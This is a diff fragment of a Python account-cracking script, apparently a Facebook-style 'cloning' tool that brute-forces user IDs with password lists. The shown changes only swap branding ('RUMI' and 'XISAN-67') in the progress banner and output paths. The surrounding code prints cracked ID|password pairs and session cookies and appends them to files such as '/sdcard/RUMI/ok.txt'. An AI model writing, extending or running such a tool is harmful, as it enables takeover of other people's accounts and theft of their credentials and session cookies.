@@ -440,7 +440,7 @@ def rcrack1(uid,pwx,tl):
 
             session = requests.Session()
 
-            sys.stdout.write('\r[\033[1;92mRUMI\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mXISAN-67\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
 
             sys.stdout.flush()
 
@@ -508,11 +508,11 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[7:22]
 
-                print(f"\033[38;5;46m[XISAN-67-OK🌻] {uid}|{ps}")
+                print(f"\033[38;5;46m[RUMI-OK🌻] {uid}|{ps}")
 
                 print(f"\n[COOKIE🎁] : {coki}")
 
-                open('/sdcard/XISAN-67/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/RUMI/ok.txt', 'a').write( uid+' | '+ps+'\n')
 
                 oks.append(uid)
 
@@ -524,9 +524,9 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[82:97]
 
-                print(f"\x1b[38;5;196m[XISAN-67-CP❌] {uid}|{ps}")
+                print(f"\x1b[38;5;196m[RUMI-CP❌] {uid}|{ps}")
 
-                open('/sdcard/XISAN-67-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/RUMI-CP.txt', 'a').write( uid+' | '+ps+' \n')
 
                 cps.append(uid)
 
